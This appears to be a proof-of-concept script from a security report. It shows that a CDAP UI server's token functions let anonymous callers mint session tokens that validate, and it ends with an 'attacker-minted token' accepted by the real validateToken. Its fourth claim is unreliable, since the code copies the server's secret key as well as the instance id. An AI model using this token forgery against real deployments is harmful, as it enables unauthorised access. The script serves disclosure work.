// Uses the REAL, unmodified server/token.mjs (byte-diffed against the repo
// before this file was written). Only supplies a cdapConfig object and a
// logger - no modification to the module itself.
import { generateToken, validateToken } from './token.REAL.mjs';

const cdapConfig = {
  'instance.metadata.id': 'some-cdap-instance-id',
  'session.secret.key': 'a-real-configured-secret-so-we-avoid-the-__dirname-fallback-path',
};

console.log('=== Claim 1: generateToken() signature vs. what express.js actually passes ===');
console.log('Real call site in server/express.js:');
console.log("  const sToken = sessionToken.generateToken(cdapConfig, log, authToken);");
console.log('Real function signature in server/token.mjs:');
console.log('  export function generateToken(cdapConfig, logger = console) { ... }');
console.log('-> the 3rd argument (authToken, i.e. the caller\'s own credential) has no parameter to bind to.');
console.log('');

console.log('=== Claim 2: minting a token with NO real credential/session context ===');
// Simulate an anonymous caller: nothing that identifies who is asking, just
// the same server-wide cdapConfig every caller sees.
const anonymousToken1 = generateToken(cdapConfig, console);
const anonymousToken2 = generateToken(cdapConfig, console);
console.log('Token minted by "anonymous caller A":', anonymousToken1);
console.log('Token minted by "anonymous caller B":', anonymousToken2);

console.log('');
console.log('=== Claim 3: the REAL validateToken() accepts both, with zero identity check ===');
console.log('validateToken(anonymousToken1) =>', validateToken(anonymousToken1, cdapConfig, console));
console.log('validateToken(anonymousToken2) =>', validateToken(anonymousToken2, cdapConfig, console));

console.log('');
console.log('=== Control: garbage token is correctly rejected (proves validateToken is doing real work) ===');
console.log('validateToken("garbage") =>', validateToken('garbage', cdapConfig, console));
console.log('validateToken(undefined) =>', validateToken(undefined, cdapConfig, console));

console.log('');
console.log('=== Claim 4: a token minted for one "instance" config is valid for ANY caller who knows instance.metadata.id ===');
console.log('(instance.metadata.id is returned in the unauthenticated GET /config.js response - see report)');
const attackerConfig = { ...cdapConfig }; // attacker builds the identical config themselves
const attackerMintedToken = generateToken(attackerConfig, console);
console.log('Attacker-minted token:', attackerMintedToken);
console.log('Does the REAL server-side validateToken() accept it? =>', validateToken(attackerMintedToken, cdapConfig, console));
